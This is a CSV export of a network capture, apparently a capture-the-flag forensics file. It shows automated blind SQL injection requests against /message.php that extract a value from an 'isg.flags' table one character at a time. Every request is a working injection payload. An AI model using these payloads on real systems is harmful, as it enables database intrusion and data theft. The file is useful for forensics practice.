"No.","Time","Source","Destination","Protocol","Length","Info"
"2836","2014-09-03 15:02:37.923955","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E64 HTTP/1.1 "
"2838","2014-09-03 15:02:37.925277","10.0.0.201","10.0.0.101","HTTP","467","HTTP/1.1 200 OK  (text/html)"
"2846","2014-09-03 15:02:37.928537","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E96 HTTP/1.1 "
"2848","2014-09-03 15:02:37.929758","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"2856","2014-09-03 15:02:37.932922","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E80 HTTP/1.1 "
"2858","2014-09-03 15:02:37.934195","10.0.0.201","10.0.0.101","HTTP","467","HTTP/1.1 200 OK  (text/html)"
"2866","2014-09-03 15:02:37.937549","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E88 HTTP/1.1 "
"2868","2014-09-03 15:02:37.938836","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"2876","2014-09-03 15:02:37.943152","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E84 HTTP/1.1 "
"2878","2014-09-03 15:02:37.944402","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"2886","2014-09-03 15:02:37.952881","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E82 HTTP/1.1 "
"2888","2014-09-03 15:02:37.954167","10.0.0.201","10.0.0.101","HTTP","467","HTTP/1.1 200 OK  (text/html)"
"2896","2014-09-03 15:02:37.957529","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C30%2C1%29%29%3E83 HTTP/1.1 "
"2898","2014-09-03 15:02:37.958898","10.0.0.201","10.0.0.101","HTTP","467","HTTP/1.1 200 OK  (text/html)"
"2906","2014-09-03 15:02:37.962649","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E64 HTTP/1.1 "
"2908","2014-09-03 15:02:37.963925","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"2916","2014-09-03 15:02:37.967236","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E96 HTTP/1.1 "
"2918","2014-09-03 15:02:37.968564","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"2926","2014-09-03 15:02:37.971785","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E80 HTTP/1.1 "
"2928","2014-09-03 15:02:37.972936","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"2936","2014-09-03 15:02:37.976227","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E72 HTTP/1.1 "
"2938","2014-09-03 15:02:37.977893","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"2946","2014-09-03 15:02:37.981014","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E68 HTTP/1.1 "
"2948","2014-09-03 15:02:37.982277","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"2956","2014-09-03 15:02:37.985616","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E70 HTTP/1.1 "
"2958","2014-09-03 15:02:37.986847","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"2966","2014-09-03 15:02:37.990018","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C31%2C1%29%29%3E69 HTTP/1.1 "
"2968","2014-09-03 15:02:37.991325","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"2976","2014-09-03 15:02:37.994703","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E64 HTTP/1.1 "
"2978","2014-09-03 15:02:37.995952","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"2986","2014-09-03 15:02:37.999268","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E96 HTTP/1.1 "
"2988","2014-09-03 15:02:38.000486","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"2996","2014-09-03 15:02:38.003828","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E112 HTTP/1.1 "
"2998","2014-09-03 15:02:38.005143","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"3006","2014-09-03 15:02:38.008341","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E104 HTTP/1.1 "
"3008","2014-09-03 15:02:38.009608","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"3016","2014-09-03 15:02:38.012830","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E100 HTTP/1.1 "
"3018","2014-09-03 15:02:38.014095","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"3026","2014-09-03 15:02:38.017316","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E98 HTTP/1.1 "
"3028","2014-09-03 15:02:38.018594","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"3036","2014-09-03 15:02:38.021906","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C32%2C1%29%29%3E99 HTTP/1.1 "
"3038","2014-09-03 15:02:38.023234","10.0.0.201","10.0.0.101","HTTP","467","HTTP/1.1 200 OK  (text/html)"
"3046","2014-09-03 15:02:38.026704","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E64 HTTP/1.1 "
"3048","2014-09-03 15:02:38.027881","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"3056","2014-09-03 15:02:38.031208","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E96 HTTP/1.1 "
"3058","2014-09-03 15:02:38.032460","10.0.0.201","10.0.0.101","HTTP","469","HTTP/1.1 200 OK  (text/html)"
"3066","2014-09-03 15:02:38.036995","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E112 HTTP/1.1 "
"3068","2014-09-03 15:02:38.038227","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"3076","2014-09-03 15:02:38.047037","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E120 HTTP/1.1 "
"3078","2014-09-03 15:02:38.048381","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"3086","2014-09-03 15:02:38.051723","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E124 HTTP/1.1 "
"3088","2014-09-03 15:02:38.052918","10.0.0.201","10.0.0.101","HTTP","468","HTTP/1.1 200 OK  (text/html)"
"3096","2014-09-03 15:02:38.056310","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E126 HTTP/1.1 "
"3098","2014-09-03 15:02:38.057549","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"3106","2014-09-03 15:02:38.060826","10.0.0.101","10.0.0.201","HTTP","594","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C33%2C1%29%29%3E125 HTTP/1.1 "
"3108","2014-09-03 15:02:38.062036","10.0.0.201","10.0.0.101","HTTP","432","HTTP/1.1 200 OK  (text/html)"
"3116","2014-09-03 15:02:38.065788","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E64 HTTP/1.1 "
"3118","2014-09-03 15:02:38.067027","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"3126","2014-09-03 15:02:38.070279","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E32 HTTP/1.1 "
"3128","2014-09-03 15:02:38.071418","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"3136","2014-09-03 15:02:38.074838","10.0.0.101","10.0.0.201","HTTP","593","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E16 HTTP/1.1 "
"3138","2014-09-03 15:02:38.076109","10.0.0.201","10.0.0.101","HTTP","431","HTTP/1.1 200 OK  (text/html)"
"3146","2014-09-03 15:02:38.079531","10.0.0.101","10.0.0.201","HTTP","592","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E8 HTTP/1.1 "
"3148","2014-09-03 15:02:38.080788","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"3156","2014-09-03 15:02:38.084258","10.0.0.101","10.0.0.201","HTTP","592","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E4 HTTP/1.1 "
"3158","2014-09-03 15:02:38.085059","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"3166","2014-09-03 15:02:38.088229","10.0.0.101","10.0.0.201","HTTP","592","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E2 HTTP/1.1 "
"3168","2014-09-03 15:02:38.089274","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
"3176","2014-09-03 15:02:38.092465","10.0.0.101","10.0.0.201","HTTP","592","GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1 "
"3178","2014-09-03 15:02:38.093678","10.0.0.201","10.0.0.101","HTTP","430","HTTP/1.1 200 OK  (text/html)"
